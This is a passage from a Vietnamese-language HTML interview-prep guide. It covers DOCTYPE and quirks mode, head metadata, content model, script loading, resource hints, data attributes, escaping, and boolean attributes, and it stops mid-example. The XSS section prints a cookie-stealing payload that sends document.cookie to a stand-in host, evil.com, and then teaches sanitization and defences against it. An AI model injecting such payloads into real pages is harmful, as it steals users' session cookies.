---
sidebar_position: 5
title: "5. HTML nền tảng"
---

# HTML nền tảng

> *"HTML thì ai chả biết" — đúng cho tới khi interviewer hỏi vì sao `<div>` trong `<p>` làm vỡ layout, hay `defer` khác `async` ở đâu. Câu hỏi HTML ngắn nhưng lộ rất rõ ai hiểu trình duyệt, ai chỉ quen copy JSX.*

:::note[Ghi nhớ nhanh]

- ⭐ **`<!DOCTYPE html>` quyết định rendering mode** — thiếu nó, trình duyệt vào **quirks mode** (box model, line-height, table sizing kiểu IE5); kiểm tra bằng `document.compatMode` (`"CSS1Compat"` là chuẩn).
- ⭐ **`defer` vs `async`** — cả hai tải song song không chặn parser; `defer` chạy **theo thứ tự** sau khi parse xong, trước `DOMContentLoaded`; `async` chạy **ngay khi tải xong**, không giữ thứ tự. `type="module"` mặc định hành xử như `defer`.
- ⭐ **`innerHTML` với dữ liệu người dùng = XSS** — dùng `textContent`, hoặc sanitize (DOMPurify / Sanitizer API `setHTML`) + Trusted Types + CSP.
- **Content model** — `<p>` chỉ chứa *phrasing content*; parser tự đóng `<p>` khi gặp `<div>`, tạo DOM khác với markup bạn viết → hydration mismatch trong React/Next.
- **Resource hints** — `preload` (tài nguyên trang hiện tại, ưu tiên cao), `prefetch` (trang sau, ưu tiên thấp), `preconnect` (mở sẵn DNS+TCP+TLS), `dns-prefetch` (chỉ DNS), `modulepreload` (ES module + parse).
- **Boolean attribute** — có mặt là `true`, bất kể giá trị: `disabled="false"` vẫn bị disable.
- **`data-*` + `dataset`** — kebab-case trong HTML ↔ camelCase trong JS, giá trị luôn là **string**.

:::

---

## Câu 1: DOCTYPE và standards mode vs quirks mode `[Intermediate]`

### Câu hỏi

> Một trang legacy hiển thị kích thước box sai hoàn toàn so với CSS, `height: 100%` trên table cũng không như Chrome DevTools báo. Em nghi ngờ gì đầu tiên? `<!DOCTYPE html>` thực sự làm gì?

### Giải thích lý thuyết

`<!DOCTYPE html>` **không phải** thẻ HTML, cũng không còn trỏ tới DTD như thời HTML 4/XHTML. Trong HTML Living Standard, nó tồn tại với **một mục đích duy nhất**: báo cho trình duyệt render ở **no-quirks mode (standards mode)**.

Trình duyệt có 3 mode:

| Mode | Kích hoạt khi | Hệ quả chính |
| ---- | ------------- | ------------ |
| **No-quirks** (standards) | `<!DOCTYPE html>` | Tuân theo spec CSS hiện đại |
| **Limited-quirks** (almost standards) | Một số DOCTYPE HTML 4.01 Transitional / XHTML Transitional | Gần chuẩn, chỉ khác cách tính chiều cao dòng quanh ảnh inline trong table cell |
| **Quirks** | Không có DOCTYPE, hoặc DOCTYPE lạ/cũ | Mô phỏng hành vi IE5/Netscape 4 |

Một số khác biệt điển hình của quirks mode:

- Box model với `width` của một số phần tử (input, table) tính kiểu `border-box` cũ.
- `height` phần trăm trên `body`/table tính khác, ảnh inline trong table cell không có khoảng trống baseline.
- Font size không kế thừa vào `table`.
- Một số đơn vị CSS thiếu unit (`width: 100`) vẫn được chấp nhận.

DOCTYPE phải là **dòng đầu tiên** (chỉ cho phép comment/whitespace phía trước tuỳ trình duyệt — tốt nhất không có gì). Không phân biệt hoa thường.

### Code minh hoạ

```html
<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="utf-8" />
    <title>Standards mode</title>
  </head>
  <body>
    <p>Trang này render ở no-quirks mode.</p>
  </body>
</html>
```

```js
// Kiểm tra mode hiện tại ngay trong console
console.log(document.compatMode);
// "CSS1Compat"  → standards / limited-quirks
// "BackCompat"  → quirks mode

// DOCTYPE cũng là một node trong DOM
console.log(document.doctype?.name); // "html"
```

```html
<!-- ❌ Template email / CMS cũ hay gặp: comment hoặc BOM sai chỗ, XML prolog -->
<?xml version="1.0" encoding="UTF-8"?>
<html>
  <!-- Không có DOCTYPE → quirks mode -->
</html>
```

### Đáp án mẫu

> "Việc đầu tiên em kiểm tra là `document.compatMode` — nếu ra `BackCompat` thì trang đang ở **quirks mode**, thường do thiếu `<!DOCTYPE html>` hoặc có thứ gì đó chèn trước nó, ví dụ server-side template in whitespace lạ hay XML prolog. DOCTYPE trong HTML5 không còn liên quan đến DTD, nó chỉ có một việc: bật **standards mode**. Ở quirks mode, trình duyệt mô phỏng IE5 — box model của input/table, chiều cao phần trăm, khoảng baseline của ảnh trong table đều khác, nên CSS hiện đại 'chạy sai' dù code không lỗi. Fix rất rẻ: đặt `<!DOCTYPE html>` ở dòng đầu tiên. Ngoài ra em sẽ thêm check này vào lint hoặc test snapshot cho các template server-render để không tái phát."

---

## Câu 2: Cấu trúc document — `head`, meta charset, viewport, `lang` `[Intermediate]`

### Câu hỏi

> Hãy viết một khung HTML tối thiểu nhưng "production-ready". Giải thích từng dòng trong `<head>` — vì sao `meta charset` phải nằm sớm, viewport để làm gì, và `lang` ảnh hưởng gì?

### Giải thích lý thuyết

**`<meta charset="utf-8">`**
- Phải nằm trong **1024 byte đầu tiên** của document (spec yêu cầu), nếu không trình duyệt có thể đã đoán encoding sai và phải parse lại.
- HTTP header `Content-Type: text/html; charset=utf-8` được ưu tiên hơn meta. BOM ưu tiên hơn cả hai.
- Đặt nó trước `<title>` vì title có thể chứa ký tự tiếng Việt.

**`<meta name="viewport" content="width=device-width, initial-scale=1">`**
- Không có nó, trình duyệt mobile giả lập viewport rộng ~980px rồi thu nhỏ → media query mobile không ăn.
- **Không** dùng `user-scalable=no` / `maximum-scale=1` — chặn zoom, vi phạm WCAG 1.4.4. (iOS Safari hiện bỏ qua chặn zoom, nhưng Android vẫn tôn trọng.)
- `viewport-fit=cover` khi cần vẽ tràn vùng notch, kết hợp `env(safe-area-inset-*)`.
- `interactive-widget=resizes-content` điều khiển cách bàn phím ảo co viewport (Chromium).

**`lang` trên `<html>`**
- Screen reader chọn giọng/phát âm đúng.
- Trình duyệt chọn quy tắc **hyphenation** (`hyphens: auto`), quote (`q`), font fallback cho CJK.
- Công cụ dịch tự động và search engine dùng nó làm tín hiệu.
- Đoạn ngôn ngữ khác trong trang: đặt `lang` riêng trên phần tử đó.

**Thứ tự gợi ý trong `<head>`**: charset → viewport → title → preconnect → CSS quan trọng → script `defer` → meta SEO/OG. Thứ tự này ảnh hưởng tới việc trình duyệt phát hiện tài nguyên sớm (preload scanner).

### Code minh hoạ

```html
<!DOCTYPE html>
<html lang="vi" dir="ltr">
  <head>
    <!-- 1. Encoding: luôn đầu tiên, trong 1024 byte đầu -->
    <meta charset="utf-8" />

    <!-- 2. Viewport cho mobile, KHÔNG chặn zoom -->
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- 3. Title: hiển thị trên tab, bookmark, kết quả tìm kiếm -->
    <title>Đơn hàng #1234 — Shop ABC</title>

    <!-- 4. Mở sẵn kết nối tới origin quan trọng -->
    <link rel="preconnect" href="https://cdn.example.com" crossorigin />

    <!-- 5. CSS chặn render: để sớm -->
    <link rel="stylesheet" href="/styles/main.css" />

    <!-- 6. Script không chặn parser -->
    <script src="/app.js" defer></script>

    <!-- 7. Màu thanh địa chỉ theo theme -->
    <meta name="theme-color" content="#0f172a" media="(prefers-color-scheme: dark)" />
    <meta name="color-scheme" content="light dark" />

    <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
    <meta name="description" content="Chi tiết đơn hàng và trạng thái giao hàng." />
  </head>
  <body>
    <p>Xin chào. <span lang="en">Order confirmed.</span></p>
  </body>
</html>
```

```css
/* lang giúp hyphenation hoạt động đúng ngôn ngữ */
article {
  hyphens: auto;
}

/* Selector theo ngôn ngữ */
:lang(en) {
  font-style: italic;
}
```

### Đáp án mẫu

> "Khung tối thiểu của em là `<!DOCTYPE html>`, `<html lang="vi">`, rồi trong `<head>` thứ tự: `meta charset="utf-8"` đầu tiên vì spec yêu cầu nó nằm trong 1024 byte đầu — nếu muộn hơn trình duyệt có thể đoán sai encoding, tiếng Việt bị lỗi font hoặc phải parse lại. Tiếp là **viewport** `width=device-width, initial-scale=1`, thiếu nó mobile sẽ render như desktop 980px rồi thu nhỏ, media query vô dụng; em không bao giờ thêm `user-scalable=no` vì chặn zoom là lỗi accessibility. Sau đó là title, preconnect, CSS, script `defer`, rồi meta SEO. Thuộc tính `lang` em coi là bắt buộc: screen reader đọc đúng giọng, `hyphens: auto` mới chạy, Google dịch và search engine cũng dựa vào nó. Đoạn text tiếng Anh xen kẽ em gắn `lang="en"` riêng."

---

## Câu 3: Block vs inline vs inline-block và content model — vì sao `<div>` trong `<p>` vỡ `[Intermediate]`

### Câu hỏi

> Trong một component React em viết `<p>` bọc một `<div>`. Dev mode báo hydration error, còn DevTools hiển thị DOM có thêm một `<p>` rỗng. Chuyện gì đã xảy ra?

### Giải thích lý thuyết

Có **hai khái niệm khác nhau** hay bị trộn lẫn:

1. **Display (CSS)** — `block`, `inline`, `inline-block`… quyết định cách box được *vẽ*. Đổi được bằng CSS.
2. **Content model (HTML)** — quy định phần tử nào được *chứa* phần tử nào. **Không đổi được bằng CSS**. HTML5 thay khái niệm "block-level/inline-level element" cũ bằng các category: *flow content*, *phrasing content*, *interactive content*, *heading content*, *sectioning content*…

| Display | Xuống dòng | `width`/`height` | margin/padding dọc |
| ------- | ---------- | ---------------- | ------------------ |
| `block` | Chiếm hết hàng | Có hiệu lực | Có hiệu lực |
| `inline` | Nằm trong dòng | **Bị bỏ qua** | Padding vẽ ra nhưng **không đẩy** dòng; margin dọc bị bỏ qua |
| `inline-block` | Nằm trong dòng | Có hiệu lực | Có hiệu lực, đẩy dòng |

**Vì sao `<p>` chứa `<div>` vỡ?** Content model của `<p>` chỉ cho phép **phrasing content** (`span`, `a`, `strong`, `img`, text…). Khi HTML parser gặp thẻ mở `<div>` trong lúc đang mở `<p>`, thuật toán tree construction **tự đóng `<p>`** trước. Thẻ đóng `</p>` sau đó không còn `<p>` nào mở → parser tạo một `<p>` rỗng mới.

Kết quả: markup `<p><div>x</div></p>` thành DOM `<p></p><div>x</div><p></p>`.

Với React SSR: server gửi HTML string → trình duyệt parse thành DOM khác → React hydrate so sánh cây ảo với DOM thật → **hydration mismatch**.

Các trường hợp tương tự:
- `<a>` lồng `<a>`, `<button>` trong `<button>` — interactive content không được lồng interactive content.
- `<ul>` chỉ chứa `<li>` (và `script`/`template`).
- `<table>` không có `<tbody>` → parser tự chèn `<tbody>`; React sẽ cảnh báo.
- `<a>` **được** bọc block (transparent content model) miễn là bên trong không có interactive content.

### Code minh hoạ

```html
<!-- ❌ Markup viết ra -->
<p>
  Giá:
  <div class="price">199.000đ</div>
</p>

<!-- DOM thực tế sau khi parse -->
<p>Giá:</p>
<div class="price">199.000đ</div>
<p></p>

<!-- ✅ Dùng phrasing content -->
<p>
  Giá:
  <span class="price">199.000đ</span>
</p>

<!-- ✅ Hoặc đổi container ngoài thành div -->
<div class="price-row">
  Giá:
  <div class="price">199.000đ</div>
</div>
```

```css
/* Nếu cần span có width/height → đổi display, không đổi thẻ */
.price {
  display: inline-block;
  min-width: 120px;
  padding: 4px 8px;
}
```

```js
// Kiểm chứng trong console
const tpl = document.createElement("template");
tpl.innerHTML = "<p>a<div>b</div></p>";
console.log(tpl.innerHTML);
// "<p>a</p><div>b</div><p></p>"
```

### Đáp án mẫu

> "Lỗi nằm ở **content model**, không phải CSS. `<p>` chỉ được chứa phrasing content, nên khi HTML parser gặp `<div>` nó tự đóng `<p>` trước, và `</p>` thừa phía sau tạo ra một `<p>` rỗng. Server gửi chuỗi HTML, trình duyệt parse thành DOM khác cấu trúc mà React mong đợi, nên hydrate bị mismatch. Fix là đổi `<div>` thành `<span>` và nếu cần box thì set `display: inline-block` — display là chuyện CSS, đổi thoải mái; còn được lồng gì trong gì là chuyện HTML, CSS không cứu được. Em cũng để ý các case tương tự: `<a>` lồng `<a>`, `<button>` lồng `<button>`, table thiếu `<tbody>`. Bật `validateDOMNesting` warning của React hoặc lint `jsx-a11y` bắt được phần lớn."

---

## Câu 4: `script` thường vs `async` vs `defer` vs `type="module"` `[Senior]`

### Câu hỏi

> Trang có 3 script: analytics bên thứ ba, bundle app chính, và một polyfill mà bundle phụ thuộc. Em gắn thuộc tính gì cho từng cái? Giải thích thứ tự thực thi và tác động tới `DOMContentLoaded`.

### Giải thích lý thuyết

| Kiểu | Tải | Chặn parser? | Thời điểm chạy | Giữ thứ tự? |
| ---- | --- | ------------ | -------------- | ----------- |
| `<script src>` thường | Chặn | **Có** — dừng parse, tải, chạy | Ngay tại chỗ | Có |
| `async` | Song song | Chỉ khi chạy | **Ngay khi tải xong** | **Không** |
| `defer` | Song song | Không | Sau khi parse xong, **trước** `DOMContentLoaded` | **Có** (theo thứ tự trong document) |
| `type="module"` | Song song (kèm dependency graph) | Không | Như `defer` | Có |
| `type="module" async` | Song song | Chỉ khi chạy | Ngay khi module + dependency tải xong | Không |

Chi tiết dễ bị hỏi vặn:
- `defer`/`async` **chỉ có tác dụng với script có `src`** (classic script). Inline script bỏ qua `defer`. Riêng **inline module** thì `async` có tác dụng.
- `DOMContentLoaded` **chờ** tất cả `defer` script (và module không async). Nó **không chờ** `async` script.
- Script thường đặt **sau** một stylesheet sẽ phải chờ CSS tải xong mới chạy (vì script có thể đọc `getComputedStyle`) → CSS gián tiếp chặn parser.
- Module script: chạy ở **strict mode**, có scope riêng (không tạo biến global), luôn fetch theo **CORS**, chỉ chạy một lần dù import nhiều chỗ.
- `nomodule`: chỉ trình duyệt cũ không hỗ trợ module chạy — pattern differential loading, nay gần như không cần.
- Script chèn động bằng `document.createElement("script")` mặc định là **async**; set `script.async = false` để giữ thứ tự.
- `blocking="render"` (Chromium) cho phép script/style chặn render một cách tường minh.

Áp dụng đề bài:
- **Analytics** → `async`: độc lập, không ai phụ thuộc, chạy lúc nào cũng được.
- **Polyfill + bundle** → cả hai `defer`, polyfill đặt trước: đảm bảo thứ tự, không chặn parse.

### Code minh hoạ

```html
<head>
  <!-- Analytics: độc lập → async -->
  <script async src="https://analytics.example.com/tag.js"></script>

  <!-- Phụ thuộc nhau → defer, giữ đúng thứ tự viết -->
  <script defer src="/polyfills.js"></script>
  <script defer src="/app.js"></script>

  <!-- ES module: mặc định deferred -->
  <script type="module" src="/main.mjs"></script>

  <!-- Inline module có thể async -->
  <script type="module" async>
    import { init } from "/widgets.mjs";
    init();
  </script>
</head>
```

```js
// Thêm script động mà vẫn giữ thứ tự
function loadInOrder(urls) {
  urls.forEach((url) => {
    const s = document.createElement("script");
    s.src = url;
    s.async = false; // mặc định true với script động
    document.head.append(s);
  });
}

document.addEventListener("DOMContentLoaded", () => {
  // Mọi defer script đã chạy xong ở đây
  // async script có thể CHƯA chạy
});

window.addEventListener("load", () => {
  // Ảnh, iframe, CSS… đã tải xong
});
```

```html
<!-- Bẫy: inline script bỏ qua defer -->
<script defer>
  console.log("Chạy NGAY, defer không có tác dụng");
</script>
```

### Đáp án mẫu

> "Script thường chặn parser: trình duyệt dừng parse, tải, chạy rồi mới parse tiếp. `async` và `defer` đều tải song song; khác nhau ở lúc chạy. `async` chạy **ngay khi tải xong**, không giữ thứ tự và `DOMContentLoaded` không chờ nó — hợp cho analytics, ads, thứ không ai phụ thuộc. `defer` chạy **sau khi parse xong, theo đúng thứ tự** trong document, trước `DOMContentLoaded` — hợp cho polyfill rồi bundle chính. `type="module"` mặc định đã deferred, thêm strict mode, scope riêng và luôn fetch theo CORS. Hai bẫy em hay nhắc team: `defer` không có tác dụng với inline script, và script chèn động mặc định là async nên phải set `async = false` nếu cần thứ tự. Với đề bài: analytics `async`, polyfill và app `defer` theo thứ tự đó."

---

## Câu 5: `link rel` — preload, prefetch, preconnect, dns-prefetch, modulepreload `[Senior]`

### Câu hỏi

> LCP của trang là ảnh hero được set bằng CSS `background-image`, font chữ load trễ gây nhảy chữ. Em dùng resource hint nào để cải thiện? Phân biệt `preload` và `prefetch`.

### Giải thích lý thuyết

| Hint | Làm gì | Phạm vi | Ưu tiên |
| ---- | ------ | ------- | ------- |
| `dns-prefetch` | Chỉ resolve DNS | Origin | Rẻ, fallback cho trình duyệt cũ |
| `preconnect` | DNS + TCP + TLS | Origin | Dùng cho **2–4 origin quan trọng nhất**; mỗi kết nối tốn CPU, tự đóng sau ~10s nếu không dùng |
| `preload` | Tải **tài nguyên cụ thể của trang hiện tại** sớm | URL | Cao (theo `as`) |
| `modulepreload` | Tải + parse + compile ES module (có thể cả dependency) | URL | Cao |
| `prefetch` | Tải tài nguyên **cho navigation tiếp theo**, lưu HTTP cache | URL | Thấp nhất (idle) |

Điểm quan trọng:
- **`preload` bắt buộc có `as`** (`style`, `script`, `font`, `image`, `fetch`…). Thiếu hoặc sai `as` → tải hai lần hoặc sai ưu tiên.
- **Font preload phải có `crossorigin`** — font luôn fetch ở CORS mode, kể cả cùng origin. Thiếu → trình duyệt tải font **hai lần**.
- Preload tài nguyên không dùng trong ~3 giây → Chrome cảnh báo trong console. Preload quá nhiều = tranh băng thông với tài nguyên thật sự quan trọng.
- Preload ảnh responsive: dùng `imagesrcset` + `imagesizes`.
- Với ảnh LCP là `<img>` thì ưu tiên `fetchpriority="high"` ngay trên thẻ; preload chủ yếu hữu ích khi trình duyệt **không thể tự phát hiện** sớm (CSS background, ảnh do JS chèn, font).
- **Speculation Rules API** (`<script type="speculationrules">`) là cách hiện đại để prefetch/prerender trang tiếp theo trên Chromium, mạnh hơn `rel=prefetch`.
- Có thể gửi hint qua HTTP header `Link:` hoặc **103 Early Hints** để trình duyệt bắt đầu trước khi HTML về.

### Code minh hoạ

```html
<head>
  <!-- Origin chứa ảnh/font: mở kết nối sớm -->
  <link rel="preconnect" href="https://cdn.example.com" crossorigin />
  <link rel="dns-prefetch" href="https://cdn.example.com" />

  <!-- Ảnh hero nằm trong CSS → preload scanner không thấy → preload -->
  <link
    rel="preload"
    as="image"
    href="/hero-1200.avif"
    imagesrcset="/hero-600.avif 600w, /hero-1200.avif 1200w"
    imagesizes="100vw"
    fetchpriority="high"
  />

  <!-- Font: as="font" + type + crossorigin (bắt buộc) -->
  <link
    rel="preload"
    as="font"
    type="font/woff2"
    href="/fonts/inter-var.woff2"
    crossorigin
  />

  <!-- ES module quan trọng -->
  <link rel="modulepreload" href="/js/router.mjs" />

  <!-- Trang người dùng có khả năng vào tiếp -->
  <link rel="prefetch" href="/checkout.js" />
</head>
```

```css
@font-face {
  font-family: "Inter";
  src: url("/fonts/inter-var.woff2") format("woff2");
  font-display: swap; /* hiện fallback ngay, giảm FOIT */
}
```

```html
<!-- Prerender trang tiếp theo (Chromium) -->
<script type="speculationrules">
  {
    "prerender": [
      { "where": { "href_matches": "/product/*" }, "eagerness": "moderate" }
    ]
  }
</script>
```

### Đáp án mẫu

> "Ảnh hero nằm trong CSS `background-image` thì preload scanner không thấy — trình duyệt phải tải CSS, build CSSOM, match selector mới phát hiện ra ảnh. Nên em thêm `<link rel="preload" as="image">` kèm `imagesrcset`/`imagesizes` và `fetchpriority="high"`; tốt hơn nữa là đổi sang `<img>` thật để khỏi cần preload. Với font, em preload file woff2 với `as="font"` và **bắt buộc `crossorigin`**, thiếu là tải hai lần, kết hợp `font-display: swap`. Origin CDN thì `preconnect`. Phân biệt: `preload` là tài nguyên **của trang này**, ưu tiên cao; `prefetch` là đoán **trang sau**, ưu tiên idle. Em hạn chế preload — mỗi preload tranh băng thông, preload sai còn làm LCP chậm hơn. Muốn điều hướng tức thì thì dùng Speculation Rules để prerender."

---

## Câu 6: Thuộc tính `data-*` và `dataset` `[Intermediate]`

### Câu hỏi

> Em có một danh sách sản phẩm render từ server, mỗi item cần gắn `productId` và `price` để JS dùng khi click "Thêm vào giỏ". Em lưu ở đâu? `dataset` có gì cần lưu ý?

### Giải thích lý thuyết

`data-*` là cách **hợp lệ theo spec** để gắn dữ liệu tuỳ ý cho phần tử mà không phá validate hay đụng thuộc tính chuẩn tương lai.

Quy tắc:
- Tên sau `data-` không được chứa chữ hoa (HTML tự lowercase) và không bắt đầu bằng `xml`.
- Trong JS: `element.dataset` là một `DOMStringMap`; tên **kebab-case → camelCase**: `data-product-id` ↔ `dataset.productId`.
- Giá trị **luôn là string** — `dataset.price` là `"199000"`, cần `Number()`. Gán `dataset.active = true` sẽ lưu `"true"`. `delete el.dataset.x` để xoá.
- Dùng được trong CSS: selector `[data-state="open"]` và `attr(data-label)` trong `content`.

Khi nào **không** nên dùng:
- Dữ liệu nhạy cảm — ai cũng đọc được trong DOM.
- Dữ liệu lớn/cấu trúc phức tạp — serialize JSON vào attribute rất xấu; dùng `<script type="application/json">` hoặc state JS.
- Thay cho ngữ nghĩa: đừng dùng `data-disabled` khi có `disabled`/`aria-disabled`.

Pattern phổ biến: **event delegation** — một listener ở container, đọc `dataset` của phần tử được click qua `closest()`. Nhiều design system (Radix, Headless UI) dùng `data-state`, `data-disabled` để expose trạng thái cho styling.

### Code minh hoạ

```html
<ul id="products">
  <li data-product-id="sku-42" data-price="199000" data-in-stock="true">
    Áo thun
    <button type="button" data-action="add-to-cart">Thêm vào giỏ</button>
  </li>
  <li data-product-id="sku-43" data-price="350000" data-in-stock="false">
    Quần jean
    <button type="button" data-action="add-to-cart" disabled>Hết hàng</button>
  </li>
</ul>
```

```js
const list = document.getElementById("products");

// Event delegation: 1 listener cho cả danh sách
list.addEventListener("click", (event) => {
  const button = event.target.closest('[data-action="add-to-cart"]');
  if (!button || button.disabled) return;

  const item = button.closest("li");
  const { productId, price, inStock } = item.dataset;

  addToCart({
    id: productId,               // "sku-42"
    price: Number(price),        // string → number
    inStock: inStock === "true", // string → boolean
  });
});

// Ghi: camelCase → kebab-case tự động
const el = document.querySelector("li");
el.dataset.lastViewed = String(Date.now()); // data-last-viewed="..."
delete el.dataset.inStock;                  // xoá data-in-stock
```

```css
/* Styling theo trạng thái */
li[data-in-stock="false"] {
  opacity: 0.5;
}

/* Tooltip đơn giản từ attribute */
.badge::after {
  content: attr(data-label);
}
```

### Đáp án mẫu

> "Em dùng thuộc tính `data-*`: `data-product-id`, `data-price` trên từng item, rồi đặt **một listener** ở container theo kiểu event delegation, dùng `closest()` tìm item và đọc `dataset`. Lưu ý thứ nhất: tên kebab-case trong HTML chuyển thành camelCase trong JS, `data-product-id` thành `dataset.productId`. Thứ hai: giá trị **luôn là string**, nên `price` phải `Number()`, còn boolean phải so sánh với `"true"` — bug kinh điển là `if (el.dataset.inStock)` luôn true vì `"false"` là chuỗi không rỗng. Em không để dữ liệu nhạy cảm hay JSON lớn trong `data-*` vì ai cũng xem được trong DOM. Ngoài ra `data-state` rất tiện để style trạng thái component bằng attribute selector, thay vì toggle class."

---

## Câu 7: HTML entity, escape và XSS khi dùng `innerHTML` `[Senior]`

### Câu hỏi

> Một PR render comment của user bằng `element.innerHTML = comment`. Reviewer chặn lại. Em giải thích rủi ro và đề xuất cách làm đúng — kể cả khi product yêu cầu cho phép **bold** và link trong comment.

### Giải thích lý thuyết

**HTML entity** là cách biểu diễn ký tự có ý nghĩa đặc biệt trong HTML:

| Ký tự | Entity | Khi nào phải escape |
| ----- | ------ | ------------------- |
| `&` | `&amp;` | Luôn luôn trong text và attribute |
| `<` | `&lt;` | Trong text content |
| `>` | `&gt;` | Nên escape cho an toàn |
| `"` | `&quot;` | Trong attribute bọc nháy kép |
| `'` | `&#39;` | Trong attribute bọc nháy đơn |

Ngoài ra có named entity (`&nbsp;`, `&copy;`) và numeric (`&#8211;`, `&#x2014;`). Với UTF-8 thì không cần entity cho ký tự tiếng Việt hay emoji.

**Vì sao `innerHTML` nguy hiểm:** nó **parse chuỗi thành HTML**. Dữ liệu `<img src=x onerror="fetch('//evil.com?c='+document.cookie)">` sẽ chạy JS (DOM-based XSS). Lưu ý: thẻ `<script>` chèn qua `innerHTML` **không chạy**, nhưng event handler attribute, `javascript:` URL, `<iframe srcdoc>`… thì có.

Các sink nguy hiểm: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `setAttribute("href", userInput)` với `javascript:`, React `dangerouslySetInnerHTML`.

**Cách làm đúng, theo mức độ:**
1. Chỉ cần text → `textContent` (hoặc JSX `{value}` trong React, vốn tự escape). Không parse HTML, an toàn tuyệt đối.
2. Cần HTML giới hạn → **sanitize** bằng allowlist: DOMPurify (thư viện chuẩn de-facto), hoặc **HTML Sanitizer API** `element.setHTML(input)` — đã có trong Firefox và Chromium mới, kiểm tra hỗ trợ trước khi dựa vào.
3. Tốt hơn nữa: lưu và render từ **Markdown** hoặc định dạng có cấu trúc, sanitize đầu ra.
4. Phòng thủ chiều sâu: **CSP** (`script-src` không `unsafe-inline`), **Trusted Types** (`require-trusted-types-for 'script'`) buộc mọi gán `innerHTML` đi qua policy.
5. Validate URL: chỉ cho phép `http:`/`https:` cho `href`.

**Escape theo context**: escape cho HTML text khác escape cho attribute, URL, JS string, CSS. Không có hàm escape "vạn năng".

### Code minh hoạ

```js
const comment = `<img src=x onerror="alert(document.cookie)"> Hay quá!`;

// ❌ XSS: onerror chạy ngay
commentEl.innerHTML = comment;

// ✅ Chỉ cần text: textContent không parse HTML
commentEl.textContent = comment;
// Hiển thị đúng nguyên văn: <img src=x ...> Hay quá!
```

```js
// ✅ Cần cho phép một số thẻ: sanitize bằng allowlist (DOMPurify)
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(comment, {
  ALLOWED_TAGS: ["b", "strong", "em", "a"],
  ALLOWED_ATTR: ["href"],
});
commentEl.innerHTML = clean; // onerror đã bị loại bỏ

// ✅ HTML Sanitizer API (feature-detect)
if ("setHTML" in Element.prototype) {
  commentEl.setHTML(comment); // tự loại bỏ phần tử/thuộc tính nguy hiểm
}
```

```js
// ✅ Validate URL trước khi gán vào href
function safeHref(input) {
  try {
    const url = new URL(input, location.origin);
    return ["http:", "https:"].includes(url.protocol) ? url.href : "#";
  } catch {
    return "#";
  }
}
link.href = safeHref(userUrl); // chặn javascript:alert(1)
```

```js
// ✅ Trusted Types: chặn gán chuỗi trần vào sink nguy hiểm
// Header: Content-Security-Policy: require-trusted-types-for 'script'
const policy = trustedTypes.createPolicy("comments", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
commentEl.innerHTML = policy.createHTML(comment);
// commentEl.innerHTML = comment; → TypeError khi CSP bật
```

### Đáp án mẫu

> "`innerHTML` parse chuỗi thành HTML, nên comment kiểu `<img src=x onerror=...>` sẽ chạy JS trong origin của mình — đọc token, gọi API thay user, đó là **DOM-based XSS**. Thẻ `<script>` qua innerHTML không chạy, nhưng event handler và `javascript:` URL thì có, nên đừng nghĩ chặn `script` là đủ. Nếu chỉ hiển thị text, em dùng `textContent` — trong React thì JSX đã tự escape. Nếu product muốn bold và link, em **sanitize theo allowlist** bằng DOMPurify hoặc `setHTML` của Sanitizer API, chỉ cho `strong`, `em`, `a` với `href` đã validate `http/https`. Thêm lớp phòng thủ: CSP không cho inline script, và **Trusted Types** để mọi gán innerHTML bắt buộc đi qua policy — code review sẽ không còn phải soi từng dòng."

---

## Câu 8: `id` vs `class`, global attributes và boolean attributes `[Intermediate]`

### Câu hỏi

> Đoạn code `<button disabled="false">` vẫn bị disable — vì sao? Và nhân tiện, khác nhau giữa `id` và `class`, kể vài global attribute em hay dùng.

### Giải thích lý thuyết

**`id` vs `class`**

| | `id` | `class` |
| -- | ---- | ------- |
| Tính duy nhất | **Duy nhất** trong document (spec bắt buộc; trình duyệt không báo lỗi nhưng `getElementById` trả phần tử đầu) | Lặp lại thoải mái, một phần tử nhiều class |
| Specificity CSS | `(1,0,0)` — rất cao, khó override | `(0,1,0)` |
| Dùng cho | Fragment link `#section`, `label for`, `aria-labelledby`/`aria-describedby`, `popovertarget`, `form` attribute | Styling, nhóm phần tử |
| Bẫy | Tạo **named access** trên `window` (`window.myId`) — global pollution, DOM clobbering | |

Trong component tái sử dụng, **không hard-code `id`** — dùng `useId()` (React) để tránh trùng khi render nhiều instance.

**Global attributes** (dùng được trên mọi phần tử): `id`, `class`, `style`, `title`, `lang`, `dir`, `hidden`, `tabindex`, `data-*`, `accesskey`, `contenteditable`, `draggable`, `spellcheck`, `translate`, `inert`, `popover`, `autofocus`, `enterkeyhint`, `inputmode`, `nonce`, `is`, `part`, `slot`…

Đáng chú ý:
- `hidden` — ẩn phần tử (UA style `display: none`), nhưng CSS `display: flex` của tác giả sẽ **thắng**; `hidden="until-found"` cho phép tìm bằng Ctrl+F và tự mở (dùng `content-visibility`).
- `translate="no"` — ngăn Google Translate dịch tên thương hiệu.
- `inputmode="numeric"` — bật bàn phím số trên mobile mà không cần `type="number"`.
- `title` — **không** nên dùng làm nhãn duy nhất: không hiện trên touch, screen reader đọc không nhất quán.

**Boolean attribute**: theo spec, **sự có mặt** của attribute nghĩa là `true`, sự vắng mặt là `false`. Giá trị hợp lệ chỉ là chuỗi rỗng hoặc tên attribute (`disabled="disabled"`). `disabled="false"` vẫn có mặt → vẫn disabled.

Ngoại lệ dễ nhầm — **enumerated attribute** không phải boolean: `contenteditable="false"`, `draggable="false"`, `spellcheck="false"`, `aria-*="false"` đều **có nghĩa false thật**.

Attribute vs property: `el.disabled = false` (property) sẽ gỡ attribute. `setAttribute("disabled", "false")` thì vẫn disabled. Muốn tắt: `removeAttribute("disabled")` hoặc `toggleAttribute("disabled", false)`.

### Code minh hoạ

```html
<!-- ❌ Cả ba đều disabled -->
<button disabled="false">A</button>
<button disabled="">B</button>
<button disabled>C</button>

<!-- ✅ Không disabled: không có attribute -->
<button>D</button>

<!-- Enumerated attribute: "false" có nghĩa thật -->
<div contenteditable="false">Không sửa được</div>
<img src="/logo.svg" alt="Logo" draggable="false" />
<span translate="no">Shopee</span>
```

```js
const btn = document.querySelector("button");

// ❌ Vẫn disabled
btn.setAttribute("disabled", "false");

// ✅ Cách đúng
btn.disabled = false;               // property → gỡ attribute
btn.removeAttribute("disabled");
btn.toggleAttribute("disabled", isLoading);

// Bẫy named access: id thành biến global
// <div id="config"></div>
